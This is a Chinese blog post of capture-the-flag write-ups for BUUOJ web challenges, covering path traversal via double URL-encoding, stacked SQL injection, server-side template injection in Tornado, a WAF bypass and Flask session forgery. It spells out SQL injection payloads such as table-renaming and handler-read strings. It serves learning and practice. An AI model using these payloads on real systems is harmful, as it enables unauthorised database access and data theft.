<meta property="og:image" content="https://tva4.sinaimg.cn/large/007u7C9Rgy1giv3lrgqapj308p02h0sl.jpg">
<meta property="og:image" content="https://tva1.sinaimg.cn/large/007u7C9Rgy1giv3ovzb3sj30aq03bwee.jpg">
<meta property="og:image" content="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giv3poldw0j30xy0j8juy.jpg">
<meta property="og:image" content="https://tvax1.sinaimg.cn/large/007u7C9Rgy1giv3v2vvb6j30a902qa9y.jpg">
<meta property="og:image" content="https://tva3.sinaimg.cn/large/007u7C9Rgy1giv5rtg6mtj31h00ekdi4.jpg">
<meta property="og:image" content="https://tva1.sinaimg.cn/large/007u7C9Rgy1giv5ug9muhj31by0f4mzw.jpg">
<meta property="og:image" content="https://tva4.sinaimg.cn/large/007u7C9Rgy1giv5xxzfxvj31bf0e6wh4.jpg">
<meta property="og:image" content="https://tva3.sinaimg.cn/large/007u7C9Rgy1givvqshbrbj30pw075gm6.jpg">
<meta property="og:image" content="https://tvax1.sinaimg.cn/large/007u7C9Rgy1givwfshwfgj307g01qjr6.jpg">
<meta property="og:image" content="https://tva2.sinaimg.cn/large/007u7C9Rgy1givy1v2zepj30fr02z3yf.jpg">
<meta property="og:image" content="https://tva3.sinaimg.cn/large/007u7C9Rgy1givy6uwruaj30cb037mx1.jpg">
<meta property="og:image" content="https://tva3.sinaimg.cn/large/007u7C9Rgy1givy95zcsfj30r40att9l.jpg">
<meta property="og:image" content="https://tva3.sinaimg.cn/large/007u7C9Rgy1givyud6ezaj30c60a8jrv.jpg">
<meta property="og:image" content="https://tvax2.sinaimg.cn/large/007u7C9Rgy1givyxt3wlaj31f40jk428.jpg">
<meta property="og:image" content="https://tvax4.sinaimg.cn/large/007u7C9Rgy1givz2nxhlvj30ao03pmx4.jpg">
<meta property="og:image" content="https://tva4.sinaimg.cn/large/007u7C9Rgy1givzw7kh2ij30eg05k0sr.jpg">
<meta property="og:image" content="https://tva4.sinaimg.cn/large/007u7C9Rgy1givzz6wfooj31ar0e60ti.jpg">
<meta property="og:image" content="https://tva1.sinaimg.cn/large/007u7C9Rgy1giw00ja2x4j30vw0eata4.jpg">
<meta property="og:image" content="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giw03mnmyuj30yb0c7jsh.jpg">
<meta property="og:image" content="https://tva2.sinaimg.cn/large/007u7C9Rgy1giw05ieajnj30xh0czmya.jpg">
<meta property="og:image" content="https://tva1.sinaimg.cn/large/007u7C9Rgy1giw08ltjaaj30x90bzjsg.jpg">
<meta property="og:image" content="https://tva1.sinaimg.cn/large/007u7C9Rgy1giw0d90k2ij30x80e43zz.jpg">
<meta property="og:image" content="https://tva1.sinaimg.cn/large/007u7C9Rgy1giw0ehexn7j30y80bz0ty.jpg">
<meta property="og:image" content="https://tva2.sinaimg.cn/large/007u7C9Rgy1giw0gqcbmhj30xy0cadh5.jpg">
<meta property="og:image" content="https://tva2.sinaimg.cn/large/007u7C9Rgy1giw19f319qj30ai04kt8r.jpg">
<meta property="og:image" content="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giw1ma6qwaj30lx09ejrz.jpg">
<meta property="og:image" content="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giw4n6ec6nj30l70ctjrw.jpg">
<meta property="og:image" content="https://tvax1.sinaimg.cn/large/007u7C9Rgy1giw64s1xwsj30yq0i0go2.jpg">
<meta property="og:image" content="https://tva4.sinaimg.cn/large/007u7C9Rgy1giw651g7b6j30yn0getbo.jpg">
<meta property="og:image" content="https://tva3.sinaimg.cn/large/007u7C9Rgy1giw9diu7wsj310s0cxt9s.jpg">
<meta property="og:image" content="https://tva4.sinaimg.cn/large/007u7C9Rgy1giw9g518nij30wl0cvdgv.jpg">
<meta property="og:image" content="https://tvax3.sinaimg.cn/large/007u7C9Rgy1giw9hc2xetj30t50c0aam.jpg">
<meta property="og:image" content="https://tvax1.sinaimg.cn/large/007u7C9Rgy1giw9i7crb0j310409kjs5.jpg">
<meta property="og:image" content="https://tvax4.sinaimg.cn/large/007u7C9Rgy1giwacezpdej315f0mlqdq.jpg">
<meta property="og:image" content="https://tva4.sinaimg.cn/large/007u7C9Rgy1giwb2h6cqpj30f907q3yr.jpg">
<meta property="og:image" content="https://tvax2.sinaimg.cn/large/007u7C9Rgy1giwb87ii64j31f50jsabj.jpg">
<meta property="article:published_time" content="2020-06-08T16:00:00.000Z">
<meta property="article:modified_time" content="2020-09-19T14:09:12.898Z">
<meta property="article:author" content="灬魔龙">
<meta property="article:tag" content="buuoj">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9opzsedcj307q02g3yd.jpg">

  <meta name="format-detection" content="telephone=no,email=no">
  <meta name="theme-color" content="#9C27B0">
  <meta name="description" content="">
  <meta name="keywords" content=",buuoj">

  <meta name="mobile-web-app-capable" content="yes">
  <meta name="application-name" content="Dragon&#39;s Blog">
  <meta name="msapplication-starturl" content="https://devildragons.github.io/2020/06/09/BUUOJ%20CTF/">
  <meta name="msapplication-navbutton-color" content="#9C27B0">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-title" content="Dragon&#39;s Blog">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <link rel="apple-touch-icon" href="/images/favicon.png">

  
    <meta property="article:published_time" content="Tue Jun 09 2020 00:00:00 GMT+0800">
    <meta property="article:modified_time" content="Sat Sep 19 2020 22:09:12 GMT+0800">
  

  
    <link rel="canonical" href="https://devildragons.github.io/2020/06/09/BUUOJ%20CTF/">
  

  
  

  
  
  

  
<link rel="stylesheet" href="/css/mdui.css">
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Dragon's Blog" type="application/atom+xml">
</head>
<body class="mdui-appbar-with-toolbar mdui-drawer-body-left mdui-theme-primary-indigo mdui-theme-accent-pink">
  <script>var a=localStorage.getItem("mdui-theme-layout-dark");if(a){document.getElementsByTagName("body")[0].className+=" mdui-theme-layout-dark"};</script>
  <header id="header" class="mdui-appbar mdui-appbar-fixed mdui-appbar-scroll-hide mdui-appbar-inset">
  <div class="mdui-toolbar mdui-color-theme">
    <a href="javascript:;" class="mdui-btn mdui-btn-icon" mdui-drawer="{target: '#sidebar', swipe: true}"><i class="mdui-icon material-icons">menu</i></a>
    <a href="/" class="mdui-typo-headline">Dragon&#39;s Blog</a>
    <div class="mdui-toolbar-spacer"></div>
    <a href="javascript:;" class="mdui-btn mdui-btn-icon" mdui-dialog="{target: '#search'}" mdui-tooltip="{content: '搜索'}"><i class="mdui-icon material-icons">search</i></a>
    <a href="/atom.xml" class="mdui-btn mdui-btn-icon" mdui-tooltip="{content: 'RSS'}"><i class="mdui-icon material-icons">rss_feed</i></a>
  </div>
</header>
<div class="mdui-dialog" id="search">
  
    <div class="search-form">
      <input type="search" class="search-form-input" placeholder="输入关键词">
    </div>
    <div class="search-result" data-resource="/search.xml"></div>
  
</div>
  <aside id="sidebar" class="mdui-drawer mdui-drawer-full-height">
  <div class="mdui-grid-tile">
    <img src="/images/banner.png" style="height: 160px;">
    <img src="/images/touxiang.png" class="avatar-animation" style="position: absolute; top: 10%; left: 24px; width: 64px; height: 64px; border: 2px solid #fff; border-radius: 50%;">
    <div class="mdui-grid-tile-actions">
      <div class="mdui-grid-tile-text">
        <div class="mdui-grid-tile-title">灬魔龙</div>
        <div class="mdui-grid-tile-subtitle"><i class="mdui-icon material-icons">art_track</i></div>
      </div>
      
    </div>
  </div>

  <div class="mdui-list" mdui-collapse="{accordion: true}">
    <a href="/" class="mdui-list-item mdui-ripple">
      <i class="mdui-list-item-icon mdui-icon material-icons mdui-text-color-blue">home</i>
      <div class="mdui-list-item-content">主页</div>
    </a>
    <div class="mdui-collapse-item">
      <div class="mdui-collapse-item-header mdui-list-item mdui-ripple">
        <i class="mdui-list-item-icon mdui-icon material-icons mdui-text-color-deep-orange">inbox</i>
        <div class="mdui-list-item-content">归档</div>
        <i class="mdui-collapse-item-arrow mdui-icon material-icons">keyboard_arrow_down</i>
      </div>
      <div class="mdui-collapse-item-body mdui-list mdui-list-dense">
        
        <a class="mdui-ripple sidebar_archives-link" href="/archives/2020/07/">七月 2020<span class="mdui-ripple sidebar_archives-count">2</span></a><a class="mdui-ripple sidebar_archives-link" href="/archives/2020/06/">六月 2020<span class="mdui-ripple sidebar_archives-count">2</span></a>
        
      </div>
    </div>
    <div class="mdui-collapse-item">
      <div class="mdui-collapse-item-header mdui-list-item mdui-ripple">
        <i class="mdui-list-item-icon mdui-icon material-icons mdui-text-color-green">chrome_reader_mode</i>
        <div class="mdui-list-item-content">分类</div>
        <i class="mdui-collapse-item-arrow mdui-icon material-icons">keyboard_arrow_down</i>
      </div>
      <div class="mdui-collapse-item-body mdui-list mdui-list-dense">
        
        <a class="mdui-ripple sidebar_archives-link" href="/categories/acm/">acm<span class="mdui-ripple sidebar_archives-count">1</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/web/">web<span class="mdui-ripple sidebar_archives-count">3</span></a>
        
      </div>
    </div>
    <div class="mdui-collapse-item">
      <div class="mdui-collapse-item-header mdui-list-item mdui-ripple">
        <i class="mdui-list-item-icon mdui-icon material-icons mdui-text-color-brown">bookmark</i>
        <div class="mdui-list-item-content">标签</div>
        <i class="mdui-collapse-item-arrow mdui-icon material-icons">keyboard_arrow_down</i>
      </div>
      <div class="mdui-collapse-item-body mdui-list mdui-list-dense">
        
        <a class="mdui-ripple sidebar_archives-link" href="/tags/buuoj/" rel="tag">buuoj<span class="mdui-ripple sidebar_archives-count">1</span></a><a class="mdui-ripple sidebar_archives-link" href="/tags/cumt/" rel="tag">cumt<span class="mdui-ripple sidebar_archives-count">2</span></a><a class="mdui-ripple sidebar_archives-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入<span class="mdui-ripple sidebar_archives-count">1</span></a>
        
      </div>
    </div>
    <a href="/about" class="mdui-list-item mdui-ripple">
      <i class="mdui-list-item-icon mdui-icon material-icons mdui-text-color-purple">person</i>
      <div class="mdui-list-item-content">关于</div>
    </a>
  </div>

  <div class="mdui-divider"></div>

  <div class="mdui-list" mdui-collapse="{accordion: true}">
    
      <a href="https://github.com/devildragons" target="_blank" rel="noopener" class="mdui-list-item mdui-ripple">Github</a>
    
    <div class="mdui-collapse-item">
      <div class="mdui-collapse-item-header mdui-list-item mdui-ripple">
        <div class="mdui-list-item-content">友情链接</div>
        <i class="mdui-list-item-icon mdui-icon material-icons">link</i>
      </div>
      <div class="mdui-collapse-item-body mdui-list mdui-list-dense">
        
          <a href="https://xzlxr.github.io/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">fe1w0</a>
        
          <a href="http://iyzyi.com/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">iyzyi</a>
        
          <a href="https://ljzjsc.com/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">牢记自己是菜</a>
        
          <a href="http://iv4n.cc/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">iv4n</a>
        
          <a href="https://3nd.xyz/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">3ND</a>
        
          <a href="https://skysec.top/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">一叶飘零</a>
        
          <a href="http://ueverglow.top/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">雨夜叶雨</a>
        
          <a href="http://iluem.xyz/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">iluem</a>
        
        
      </div>
    </div>
  </div>
</aside>
  <main id="main" class="mdui-m-t-5 fadeIn animated">
  
<link rel="stylesheet" href="https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css">

  <style>#main article .mdui-card-content .center-block{display:block!important;margin-right:auto!important;margin-left:auto!important}</style>
  <article class="mdui-card mdui-m-b-5">
    <header class="mdui-card-media">
      <img src="/images/random/material-16.png" style="max-height: 240px;">
      <div class="mdui-card-media-covered">
        <div class="mdui-card-primary">
          <div class="mdui-card-primary-title">BUUOJ题解</div>
          <div class="mdui-card-primary-subtitle"><i class="iconfont">&#xe697;</i> 2020-06-09 / <i class="iconfont">&#xe601;</i> 灬魔龙 &nbsp;&nbsp; <span id="busuanzi_container_page_pv" style="display: none;"><i class="iconfont">&#xe7fd;</i> <span id="busuanzi_value_page_pv"></span></span></div>
        </div>
      </div>
      <div class="mdui-card-menu">
        
          <button class="mdui-btn mdui-btn-icon mdui-text-color-white" mdui-menu="{target: '#qrcode', align: 'right'}"><i class="mdui-icon material-icons">devices</i></button>
          <ul class="mdui-menu" id="qrcode">
            
              <li class="mdui-menu-item"><a class="mdui-text-center mdui-ripple">Send to mobile phone</a></li>
            
            <li class="mdui-menu-item" disabled>
              
                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACbElEQVR42u3aW3bDIAwFwOx/0+0CWrtXEpBHx185OYnN8AFYuo+vj74eeHh4eHh4eHh4L8Z7xNcvN/rx/f0393e++m91bHh4eHhneH8stbe8+QRdIXtjw8PDwzvJS5bsfHGvLvT3Qy9sJ3h4eHgvyasu7vd3vjwc4+Hh4f0DXvLLq0l5g40BDw8Pr/XCny/xvWLEvFCCh4eHd4aXD+7856P9PTw8PLyAV440xUfh+W+ekCnDw8PDC3j5QpwMrhcC6G0MeHh4eM/l5Yfp6oI+n6y8nYaHh4d3kpcMq1pmrTbDqnGE8r6Hh4eHt4FXPbz2hnIfIJhvS3h4eHi7eclm0CsKVCMIky0KDw8P7zyveoDuha7yuGpevIiiA3h4eHhLeckje+BqeaLXhGu+MeDh4eENeL3h5mWCarxgQfkYDw8PbzOv2tTvPbiHbE4fHh4e3mbeqnb+/PC9JXSFh4eHtzmuOlmakztUm2S9u+Hh4eGd580flrSs8kFX/4WHh4d3hjcPE1QLHPnGkDfY8PDw8E7ykmW3emhOSrfzCSpXqfHw8PAW8SbFhV77v1r2LbwG4OHh4R3n9dpU1bjA5OC+uBiBh4eHN+DdH6yTjaHZsoqvaFrx8PDwNvOqVy9GkBc+qrGtQqYMDw8PbxFvsijnEYGcmpc8Rg0wPDw8vDEv2Qx6ralqAKsavWrWWvDw8PAW8dYGCCZF23zbwMPDw3t3XoKpHqzzQAMeHh7eu/AmIYBJ461cjMDDw8PbwEuKEb3tobq4P62Mi4eHh7ehAdYbYhK6qhY4CpkyPDw8vKW8z7vw8PDw8PDw8PBe4PoGEzzOShV+VhAAAAAASUVORK5CYII=">
              
            </li>
          </ul>
        
        
          <button class="mdui-btn mdui-btn-icon mdui-text-color-white" mdui-menu="{target: '#share_menu', align: 'right'}"><i class="mdui-icon material-icons">share</i></button>
          <ul class="mdui-menu" id="share_menu">
            <li class="mdui-menu-item">
              <a href="http://service.weibo.com/share/share.php?appkey=&title=BUUOJ题解&url=https://devildragons.github.io/2020/06/09/BUUOJ%20CTF/&pic=https://devildragons.github.io/images/favicon.png&searchPic=false&style=simple" target="_blank" class="mdui-ripple">分享到微博</a>
            </li>
            <li class="mdui-menu-item">
              <a href="https://twitter.com/intent/tweet?text=BUUOJ题解&url=https://devildragons.github.io/2020/06/09/BUUOJ%20CTF/&via=灬魔龙" target="_blank" class="mdui-ripple">分享到Twitter</a>
            </li>
            <li class="mdui-menu-item">
              <a href="https://www.facebook.com/sharer/sharer.php?u=https://devildragons.github.io/2020/06/09/BUUOJ%20CTF/" target="_blank" class="mdui-ripple">分享到Facebook</a>
            </li>
            <li class="mdui-menu-item">
              <a href="https://plus.google.com/share?url=https://devildragons.github.io/2020/06/09/BUUOJ%20CTF/" target="_blank" class="mdui-ripple">分享到Google+</a>
            </li>
            <li class="mdui-menu-item">
              <a href="https://www.linkedin.com/shareArticle?mini=true&url=https://devildragons.github.io/2020/06/09/BUUOJ%20CTF/&title=BUUOJ题解" target="_blank" class="mdui-ripple">分享到LinkedIn</a>
            </li>
            <li class="mdui-menu-item">
              <a href="http://connect.qq.com/widget/shareqq/index.html?site=Dragon&#39;s Blog&title=BUUOJ题解&summary=&pics=https://devildragons.github.io/images/favicon.png&url=https://devildragons.github.io/2020/06/09/BUUOJ%20CTF/" target="_blank" class="mdui-ripple">分享到QQ</a>
            </li>
            <li class="mdui-menu-item">
              <a href="https://telegram.me/share/url?url=https://devildragons.github.io/2020/06/09/BUUOJ%20CTF/&text=BUUOJ题解" target="_blank" class="mdui-ripple">分享到Telegram</a>
            </li>
          </ul>
        
      </div>
    </header>
    <div class="mdui-card-content mdui-typo">
      <h1 id="BUUOJ"><a href="#BUUOJ" class="headerlink" title="BUUOJ"></a><em>BUUOJ</em></h1><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9opzsedcj307q02g3yd.jpg" alt=""></p>
<p>查看源码，发现提升，打开source.php页面</p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm4uifequj30no0oxdhl.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfm4uzwofrj30rp07zt9a.jpg" alt=""><br>看到题目php代码</p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9otp9bbhj30k902qweh.jpg" alt=""></p>
<p>打开hint.php页面，发现提示。<br>回到source.php页面，函数代码中有四个if语句</p>
<pre><code>第一个if语句对变量进行检验，要求$page为字符串，否则返回false
第二个if语句判断$page是否存在于$whitelist数组中，存在则返回true
第三个if语句判断截取后的$page是否存在于$whitelist数组中，截取$page中&apos;?&apos;前部分，存在则返回true
第四个if语句判断url解码并截取后的$page是否存在于$whitelist中，存在则返回true
若以上四个if语句均未返回值，则返回false</code></pre><p>有三个if语句可以返回true，第二个语句直接判断$page，不可用<br>第三个语句截取’?’前部分，由于?被后部分被解析为get方式提交的参数，也不可利用<br>第四个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为’?’，仍可通过第四个if语句校验。（’?’两次编码值为’%253f’）,构造url：<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9p1nmo3rj30rv037wej.jpg" alt=""><br>无返回值，由于我们不知道ffffllllaaaagggg文件的具体位置，只能依次增加../，最终在<img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9p3bfc4bj30x205r750.jpg" alt=""><br>中成功回显flag</p>
<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9p6owmc0j30x304waah.jpg" alt=""><br>该题考查<strong>堆叠注入</strong><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9pd5u3nfj31bi0520t3.jpg" alt=""><br>输入1’提交页面不正常</p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9peqna3ij30cd0hk750.jpg" alt=""></p>
<p>输入1’ or 1=1 #，页面变为正常，说明存在注入。</p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9pj0d3nzj30hi04s0st.jpg" alt=""></p>
<p>输入1’ order by 3#，页面出现错误，说明只有两个字段</p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9pl8yxfrj30mn04jq2x.jpg" alt=""></p>
<p>使用union select查询，发现很多语句被过滤。</p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9pso2bowj30kg0mx0tm.jpg" alt=""></p>
<p>使用堆叠注入1’;show databases; #列出数据库名。</p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9pvbzlxlj30hx0gmgma.jpg" alt=""></p>
<p>接着使用1’;show tables;#查询出表</p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9px8yi8cj309g0o6dgo.jpg" alt=""></p>
<p>使用1’;show columns from words;#查出表words的字段</p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9q1mxqi0j30bk0h3q3i.jpg" alt=""></p>
<p>然后使用<code>1&#39;;show columns from `1919810931114514`;#</code>查出表1919810931114514的字段(如果表名为纯数字，则需要加上`),从而发现flag字段。</p>
<p>因为这里有两张表，会县内容肯定是从word这张表中回显的，那我们怎么才能让它回显flag所在的表呢</p>
<p>内部查询语句类似 : select id, data from word where id =</p>
<p>(这里从上面的对word列的查询可以看到它是有两列，id和data)</p>
<p>然后1919810931114514只有一个flag字段</p>
<p>这时候虽然有强大的正则过滤，但没有过滤alert和rename关键字</p>
<p>这时候我们就可以已下面的骚姿势进行注入：</p>
<p>1.将words表改名为word1或其它任意名字</p>
<p>2.1919810931114514改名为words</p>
<p>3.将新的word表插入一列，列名为id</p>
<p>4.将flag列改名为data</p>
<p>构造payload</p>
<pre><code>1&apos;;rename table words to word1;rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);#</code></pre><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9q65ogotj30io06mq32.jpg" alt=""></p>
<p>然后使用1’ or 1=1 #查询获得flag.</p>
<p>第二种方法，参考[GYCTF2020]Blacklist<br>构造Payload:</p>
<pre><code>1&apos;;handler `1919810931114514` open;handler `1919810931114514` read first;handler `1919810931114514` close;#</code></pre><p>获得flag。</p>
<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>同样是考察堆叠注入</p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qe0hjvej30g7046746.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qhhl6mej30eo04q0sn.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qhqxmofj30ev04x747.jpg" alt=""></p>
<p>输入1发现页面有回显，输入1-1数值改变，说明是数值型的注入。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qkfyws7j31cl044wen.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qkzny0hj30er03mwef.jpg" alt=""></p>
<p>依次查询数据库并查询出表，并发现Flag表</p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qnjgiugj30fr032gli.jpg" alt=""></p>
<p>但发现from Flag被过滤所以不能直接读取flag</p>
<p>看了别人的题解知道本题的原理</p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qpv9tp0j30cy01kdfn.jpg" alt=""></p>
<p>解题思路1：</p>
<p>payload：<img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qtrqv9hj301e00y0dl.jpg" alt=""></p>
<p>查询语句：<img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qt6po3gj307f00xmwx.jpg" alt=""></p>
<p>解题思路2：</p>
<p>payload:1;</p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gf9qsq9fjbj30b100uwea.jpg" alt=""></p>
<p>解析：</p>
<pre><code>在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接。
但在mysql 缺省不支持。需要调整mysql 的sql_mode
模式：pipes_as_concat 来实现oracle 的一些功能。</code></pre><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>本题考查<strong>ssti(服务端模板注入)</strong><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaa6dsmr9j309h043745.jpg" alt=""></p>
<p>打开页面发现3个文件</p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaa8gc7ajj307n02h742.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaaeo8xoej30x601m0ss.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaa8smxbmj304w029we9.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaaf34iioj30wh01vglo.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaa91n0zhj30b9026glf.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaafapucfj30ux01qmx7.jpg" alt=""></p>
<p>依次打开三个txt文件得到提示，所以需要知道cookie_secret。</p>
<p><a href="https://blog.csdn.net/qq78827534/article/details/80792514" target="_blank" rel="noopener" title="render函数介绍">https://blog.csdn.net/qq78827534/article/details/80792514</a></p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaai2hq1uj30uu01w0ss.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaaiwi6ifj308f036dfm.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaaj6kp2cj30jz025mx4.jpg" alt=""></p>
<p>只修改文件名不修改文件hash值，报错。</p>
<p>可以看到在报错的url中参数msg值为Error，然后界面就显示Error。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaaovcufmj30xt0330sy.jpg" alt=""><br>继续修改证实此处存在模板注入<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaaqglp4mj31ap0h9403.jpg" alt=""><br>在这里我们应该可以得到cookie_secret</p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaas3fnwdj30b9026glf.jpg" alt=""></p>
<p>然后照着hint解出文件得hash值</p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaax5makhj314h0hk3zl.jpg" alt=""></p>
<p>从而获得flag。</p>
<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfab2fglexj31540jsgzp.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfab3fdaq7j30cx0bc42b.jpg" alt=""></p>
<p>尝试万能密码<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfab4aph2oj30pp0d8qa3.jpg" alt=""></p>
<p>获得flag.</p>
<h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfab99x02cj315207oglp.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfab8totonj30ln066aap.jpg" alt=""></p>
<p>查看源代码，发现提示所以需要绕过WAF。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfabgnz7w1j30v30bpt9s.jpg" alt=""></p>
<p>查看calc.php页面，显示了waf的法则。</p>
<p>进行绕waf，首先了解一下php的解析规则，当php进行解析的时候，如果变量前面有空格，会去掉前面的空格再解析，那么我们就可以利用这个特点绕过waf。</p>
<p>num被限制了，那么’  num’呢，在num前面加了空格。waf就管不着了，因为waf只是限制了num，waf并没有限制’  num’，当php解析的时候，又会把’   num’前面的空格去掉在解析，利用这点来上传非法字符</p>
<p>构造payload来查看目录，用chr转化成ascll码进行绕过<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfabuatrf6j31gu0hgtaf.jpg" alt=""><br>发现 string(5) “f1agg”<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfabyjc1ynj31250h9my7.jpg" alt=""><br>查看flag。</p>
<h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfac0kkj6ej30ek07yjrq.jpg" alt=""></p>
<p>查看源代码，发现提示<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfac1m4l3kj31820ejgmy.jpg" alt=""></p>
<p>构造payload获得flag。</p>
<h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>存在以下三种解法：</p>
<pre><code>flask session 伪造
unicode欺骗
条件竞争</code></pre><p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaglrpya9j30mk0h7js1.jpg" alt=""><br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfagmn0wcij30ia09h3yk.jpg" alt=""></p>
<p>注册一个test用户，登录。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfagoh0dvwj30ry08udh3.jpg" alt=""><br>在修改密码的源码中发现提示。<br><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfagqd7i8tj30m70avaay.jpg" alt=""></p>
<p>下载文件</p>
<p><img src="http://ww1.sinaimg.cn/large/007u7C9Rgy1gfaijmd63ej30jw03edfv.jpg" alt=""></p>
<p>是一个flask项目，那就直接先奔路由去看一下，打开route.py，看一下index的注册函数代码</p>
